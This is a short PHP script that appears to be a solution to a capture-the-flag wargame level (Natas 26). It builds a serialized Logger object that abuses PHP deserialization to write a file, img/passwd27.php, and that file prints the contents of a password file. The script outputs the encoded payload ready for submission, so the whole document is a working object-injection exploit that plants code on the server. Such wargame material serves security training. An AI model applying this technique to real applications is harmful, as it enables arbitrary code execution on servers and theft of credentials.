<?php

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct(){
        $this->initMsg="Anything goes here\n";
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
        $this->logFile = "img/passwd27.php";
    }
}

$o = new Logger();
print urlencode(base64_encode(serialize($o)))."\n";
?>